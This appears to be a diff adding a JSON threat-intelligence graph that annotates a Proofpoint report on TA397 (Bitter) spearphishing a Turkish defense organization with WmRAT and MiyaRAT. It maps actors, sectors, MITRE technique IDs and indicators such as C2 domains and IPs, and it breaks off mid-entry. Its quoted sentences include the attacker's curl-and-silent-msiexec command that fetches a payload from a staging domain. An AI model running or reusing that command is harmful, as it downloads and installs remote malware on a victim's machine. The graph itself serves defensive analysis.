@@ -1,0 +1,1285 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0b8862a70333",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Turkey",
+        "edges": [],
+        "sentence_indices": [
+          5
+        ],
+        "span_sentences": [
+          "On November 18, 2024, TA397 (also known by third-party researchers as Bitter) targeted a defense sector organization in Turkey with a spearphishing lure."
+        ]
+      },
+      {
+        "node_id": "HL_0f4e0fd9f1e0",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MiyaRAT",
+        "edges": [
+          "EDGE_1",
+          "EDGE_2"
+        ],
+        "sentence_indices": [
+          2,
+          8,
+          21,
+          31,
+          43,
+          45,
+          46
+        ],
+        "span_sentences": [
+          "- TA397 was observed manually delivering WmRAT and MiyaRAT malware families in the final stages of this attack chain.",
+          "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload.",
+          "MiyaRAT is also written in C++ and contains similar functionality to WmRAT.",
+          "Proofpoint assesses WmRAT and MiyaRAT are two distinct malware families in active, operational use by TA397.",
+          "It is also clear that MiyaRAT is the newer of the two tools in their arsenal.",
+          "Proofpoint assesses MiyaRAT may be reserved for targets TA397 deems high value due to the observed sporadic deployment of the malware in only a certain number of campaigns."
+        ]
+      },
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_3"
+        ],
+        "sentence_indices": [
+          6,
+          11,
+          23
+        ],
+        "span_sentences": [
+          "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+          "This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”.",
+          "The RAT can gather basic host information, upload or download files, take screenshots, get geolocation data of the target machine, enumerate directories and files, and run arbitrary commands via cmd or PowerShell."
+        ]
+      },
+      {
+        "node_id": "HL_2e8ca1ab3f71",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "energy",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_3d9419e7e021",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Bitter",
+        "edges": [],
+        "sentence_indices": [
+          5,
+          47
+        ],
+        "span_sentences": [
+          "On November 18, 2024, TA397 (also known by third-party researchers as Bitter) targeted a defense sector organization in Turkey with a spearphishing lure.",
+          "Based on Proofpoint's analysis of the characteristics of the observed campaign, previously observed lure content, historical targeting, time-based analysis of TA397 campaigns, and a review of industry reporting on activity associated to Bitter, Proofpoint researchers assess these campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests."
+        ]
+      },
+      {
+        "node_id": "HL_50ef26c8e6f5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Madagascar",
+        "edges": [],
+        "sentence_indices": [
+          0,
+          6
+        ],
+        "span_sentences": [
+          "Proofpoint observed advanced persistent threat (APT) TA397 targeting a Turkish defense sector organization with a lure about public infrastructure projects in Madagascar.",
+          "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code."
+        ]
+      },
+      {
+        "node_id": "HL_5827ab97cb13",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "TA397",
+        "edges": [
+          "EDGE_4",
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7",
+          "EDGE_8",
+          "EDGE_9",
+          "EDGE_10",
+          "EDGE_11",
+          "EDGE_12",
+          "EDGE_13",
+          "EDGE_14",
+          "EDGE_15",
+          "EDGE_16",
+          "EDGE_17"
+        ],
+        "sentence_indices": [
+          0,
+          2,
+          4,
+          5,
+          7,
+          8,
+          13,
+          16,
+          19,
+          20,
+          39,
+          43,
+          46,
+          48
+        ],
+        "span_sentences": [
+          "Proofpoint observed advanced persistent threat (APT) TA397 targeting a Turkish defense sector organization with a lure about public infrastructure projects in Madagascar.",
+          "- TA397 was observed manually delivering WmRAT and MiyaRAT malware families in the final stages of this attack chain.",
+          "- Proofpoint assesses TA397 campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests.",
+          "On November 18, 2024, TA397 (also known by third-party researchers as Bitter) targeted a defense sector organization in Turkey with a spearphishing lure.",
+          "This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware.",
+          "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+          "This URI structure is used regularly by TA397.",
+          "Proofpoint observed TA397 operators respond to these requests with manual commands approximately 12 hours after the first scheduled task request, deploying two distinct payloads and a third command that enumerated the target machine and issues a POST request containing that information.",
+          "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain.",
+          "A very similar set of commands was previously observed and attributed to TA397 and published by StrikeReady Labs.",
+          "TA397’s infrastructure usage throughout this campaign is divided between the implant domains and the staging domains.",
+          "Proofpoint assesses WmRAT and MiyaRAT are two distinct malware families in active, operational use by TA397.",
+          "Proofpoint assesses MiyaRAT may be reserved for targets TA397 deems high value due to the observed sporadic deployment of the malware in only a certain number of campaigns.",
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_61f1204b710f",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "South Asian",
+        "edges": [],
+        "sentence_indices": [
+          4,
+          47
+        ],
+        "span_sentences": [
+          "- Proofpoint assesses TA397 campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests.",
+          "Based on Proofpoint's analysis of the characteristics of the observed campaign, previously observed lure content, historical targeting, time-based analysis of TA397 campaigns, and a review of industry reporting on activity associated to Bitter, Proofpoint researchers assess these campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests."
+        ]
+      },
+      {
+        "node_id": "HL_68ab80b9bfb4",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "engineering organizations",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_6ea4c2eafd43",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "World Bank",
+        "edges": [],
+        "sentence_indices": [
+          6,
+          11
+        ],
+        "span_sentences": [
+          "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+          "This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”."
+        ]
+      },
+      {
+        "node_id": "HL_7aa4727bd97e",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "WmRAT",
+        "edges": [
+          "EDGE_18",
+          "EDGE_19"
+        ],
+        "sentence_indices": [
+          2,
+          18,
+          22,
+          43
+        ],
+        "span_sentences": [
+          "- TA397 was observed manually delivering WmRAT and MiyaRAT malware families in the final stages of this attack chain.",
+          "This command downloads and runs the “anvrsa.msi” file on the target machine which installs the WmRAT file “anvrsa.exe”.",
+          "WmRAT is a remote access trojan (RAT) written in C++ that uses sockets for communications and has standard RAT functionality.",
+          "Proofpoint assesses WmRAT and MiyaRAT are two distinct malware families in active, operational use by TA397."
+        ]
+      },
+      {
+        "node_id": "HL_843a7dc271c3",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "South-Asian",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_903464adf545",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Proofpoint",
+        "edges": [],
+        "sentence_indices": [
+          0,
+          4,
+          16,
+          21,
+          43,
+          46,
+          47
+        ],
+        "span_sentences": [
+          "Proofpoint observed advanced persistent threat (APT) TA397 targeting a Turkish defense sector organization with a lure about public infrastructure projects in Madagascar.",
+          "- Proofpoint assesses TA397 campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests.",
+          "Proofpoint observed TA397 operators respond to these requests with manual commands approximately 12 hours after the first scheduled task request, deploying two distinct payloads and a third command that enumerated the target machine and issues a POST request containing that information.",
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload.",
+          "Proofpoint assesses WmRAT and MiyaRAT are two distinct malware families in active, operational use by TA397.",
+          "Proofpoint assesses MiyaRAT may be reserved for targets TA397 deems high value due to the observed sporadic deployment of the malware in only a certain number of campaigns.",
+          "Based on Proofpoint's analysis of the characteristics of the observed campaign, previously observed lure content, historical targeting, time-based analysis of TA397 campaigns, and a review of industry reporting on activity associated to Bitter, Proofpoint researchers assess these campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests."
+        ]
+      },
+      {
+        "node_id": "HL_ab757af3e503",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "WMIC",
+        "edges": [
+          "EDGE_20"
+        ],
+        "sentence_indices": [
+          19
+        ],
+        "span_sentences": [
+          "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain."
+        ]
+      },
+      {
+        "node_id": "HL_adc349104a82",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "telecommunications",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_c6426a20d0e4",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "curl",
+        "edges": [
+          "EDGE_21",
+          "EDGE_22"
+        ],
+        "sentence_indices": [
+          12,
+          21
+        ],
+        "span_sentences": [
+          "This scheduled task attempted to send target host information (username and computer name) with the curl utility every 17 minutes to the domain jacknwoods[.]com.",
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+        ]
+      },
+      {
+        "node_id": "HL_cbb32ed6911b",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "EMEA",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_cfbae3728144",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "StrikeReady Labs",
+        "edges": [],
+        "sentence_indices": [
+          20
+        ],
+        "span_sentences": [
+          "A very similar set of commands was previously observed and attributed to TA397 and published by StrikeReady Labs."
+        ]
+      },
+      {
+        "node_id": "HL_d2cff58de712",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "APAC",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      },
+      {
+        "node_id": "HL_fb856460e667",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "defense",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1027",
+        "edges": [
+          "EDGE_1",
+          "EDGE_4",
+          "EDGE_18",
+          "EDGE_28",
+          "EDGE_29",
+          "EDGE_41"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            6,
+            9
+          ],
+          [
+            22,
+            25
+          ],
+          [
+            31,
+            34
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "- The attack chain used alternate data streams in a RAR archive to deliver a shortcut (LNK) file that created a scheduled task on the target machine to pull down further payloads."
+          ],
+          [
+            "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+            "This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware.",
+            "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+            "The spearphishing email originated from a compromised email account belonging to a government organization and contained a RAR archive with a variety of artifacts inside."
+          ],
+          [
+            "WmRAT is a remote access trojan (RAT) written in C++ that uses sockets for communications and has standard RAT functionality.",
+            "The RAT can gather basic host information, upload or download files, take screenshots, get geolocation data of the target machine, enumerate directories and files, and run arbitrary commands via cmd or PowerShell.",
+            "The malware also generates a number of junk threads, potentially to mislead researchers or responders investigating the samples.",
+            "The malware decrypts the C2 server address academymusica[.]com by taking each character from an encrypted blob and subtracting 0x25 from it."
+          ],
+          [
+            "MiyaRAT is also written in C++ and contains similar functionality to WmRAT.",
+            "The malware starts by decrypting its hardcoded C2 server.",
+            "This domain is decoded by taking the encoded value and subtracting the matching character in the string “doobiedoodooziezzz” from it.",
+            "Decoding C2 server samsnewlooker[.]com."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1036",
+        "edges": [
+          "EDGE_5",
+          "EDGE_23"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            9
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+            "This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware.",
+            "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+            "The spearphishing email originated from a compromised email account belonging to a government organization and contained a RAR archive with a variety of artifacts inside."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1041",
+        "edges": [
+          "EDGE_6",
+          "EDGE_35"
+        ],
+        "best_span_ranges": [
+          [
+            38,
+            38
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "After the socket is initialized, MiyaRAT gathers basic system information which is sent in the first communication to the C2."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1047",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1047",
+        "edges": [
+          "EDGE_7",
+          "EDGE_20"
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1053",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1053",
+        "edges": [
+          "EDGE_8",
+          "EDGE_36"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            11,
+            11
+          ],
+          [
+            12,
+            12
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "- The attack chain used alternate data streams in a RAR archive to deliver a shortcut (LNK) file that created a scheduled task on the target machine to pull down further payloads."
+          ],
+          [
+            "This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”."
+          ],
+          [
+            "This scheduled task attempted to send target host information (username and computer name) with the curl utility every 17 minutes to the domain jacknwoods[.]com."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1057",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1057",
+        "edges": [
+          "EDGE_9"
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_3",
+          "EDGE_10",
+          "EDGE_21",
+          "EDGE_37"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            9
+          ],
+          [
+            11,
+            11
+          ],
+          [
+            12,
+            12
+          ],
+          [
+            16,
+            16
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            19,
+            19
+          ],
+          [
+            21,
+            21
+          ],
+          [
+            22,
+            25
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+            "This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware.",
+            "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+            "The spearphishing email originated from a compromised email account belonging to a government organization and contained a RAR archive with a variety of artifacts inside."
+          ],
+          [
+            "This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”."
+          ],
+          [
+            "This scheduled task attempted to send target host information (username and computer name) with the curl utility every 17 minutes to the domain jacknwoods[.]com."
+          ],
+          [
+            "Proofpoint observed TA397 operators respond to these requests with manual commands approximately 12 hours after the first scheduled task request, deploying two distinct payloads and a third command that enumerated the target machine and issues a POST request containing that information."
+          ],
+          [
+            "This command downloads and runs the “anvrsa.msi” file on the target machine which installs the WmRAT file “anvrsa.exe”."
+          ],
+          [
+            "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain."
+          ],
+          [
+            "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+          ],
+          [
+            "WmRAT is a remote access trojan (RAT) written in C++ that uses sockets for communications and has standard RAT functionality.",
+            "The RAT can gather basic host information, upload or download files, take screenshots, get geolocation data of the target machine, enumerate directories and files, and run arbitrary commands via cmd or PowerShell.",
+            "The malware also generates a number of junk threads, potentially to mislead researchers or responders investigating the samples.",
+            "The malware decrypts the C2 server address academymusica[.]com by taking each character from an encrypted blob and subtracting 0x25 from it."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_11",
+          "EDGE_22",
+          "EDGE_34",
+          "EDGE_38"
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Proofpoint observed TA397 operators respond to these requests with manual commands approximately 12 hours after the first scheduled task request, deploying two distinct payloads and a third command that enumerated the target machine and issues a POST request containing that information."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1082",
+        "edges": [
+          "EDGE_12"
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ],
+          [
+            38,
+            38
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Proofpoint observed TA397 operators respond to these requests with manual commands approximately 12 hours after the first scheduled task request, deploying two distinct payloads and a third command that enumerated the target machine and issues a POST request containing that information."
+          ],
+          [
+            "After the socket is initialized, MiyaRAT gathers basic system information which is sent in the first communication to the C2."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1083",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1083",
+        "edges": [
+          "EDGE_13"
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_2",
+          "EDGE_14",
+          "EDGE_19",
+          "EDGE_26",
+          "EDGE_27",
+          "EDGE_30",
+          "EDGE_32",
+          "EDGE_33",
+          "EDGE_39",
+          "EDGE_40"
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            21,
+            21
+          ],
+          [
+            40,
+            40
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "- TA397 was observed manually delivering WmRAT and MiyaRAT malware families in the final stages of this attack chain."
+          ],
+          [
+            "This command downloads and runs the “anvrsa.msi” file on the target machine which installs the WmRAT file “anvrsa.exe”."
+          ],
+          [
+            "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+          ],
+          [
+            "The jacknwoods[.]com domain acted as their staging domain to distribute WmRAT and MiyaRAT, and academymusica[.]com and samsnewlooker[.]com as C2 domains for each implant."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1204",
+        "edges": [
+          "EDGE_15",
+          "EDGE_24"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            9
+          ],
+          [
+            11,
+            11
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+            "This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware.",
+            "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+            "The spearphishing email originated from a compromised email account belonging to a government organization and contained a RAR archive with a variety of artifacts inside."
+          ],
+          [
+            "This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1564",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1564",
+        "edges": [
+          "EDGE_16",
+          "EDGE_25",
+          "EDGE_31"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "- The attack chain used alternate data streams in a RAR archive to deliver a shortcut (LNK) file that created a scheduled task on the target machine to pull down further payloads."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1566",
+        "edges": [
+          "EDGE_17"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            9
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+            "This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware.",
+            "This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.",
+            "The spearphishing email originated from a compromised email account belonging to a government organization and contained a RAR archive with a variety of artifacts inside."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_0812b61c3629",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "96.9.215[.]155",
+        "edges": [],
+        "sentence_indices": [
+          41
+        ],
+        "span_sentences": [
+          "The WmRAT C2 academymusica[.]com resolved to 38.180.142[.]228 at the time of analysis, while theMiyaRAT C2 samsnewlooker[.]comresolved to 96.9.215[.]155."
+        ]
+      },
+      {
+        "node_id": "IOC_095f3fa1a675",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "xrgtg.exe",
+        "edges": [],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+        ]
+      },
+      {
+        "node_id": "IOC_0e91333e51f7",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk",
+        "edges": [
+          "EDGE_23",
+          "EDGE_24",
+          "EDGE_25"
+        ],
+        "sentence_indices": [
+          6
+        ],
+        "span_sentences": [
+          "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code."
+        ]
+      },
+      {
+        "node_id": "IOC_19ebb6f6f523",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "gfxview.msi",
+        "edges": [
+          "EDGE_26"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+        ]
+      },
+      {
+        "node_id": "IOC_3270fb859d9a",
+        "node_class": "ioc",
+        "node_type": "FilePath",
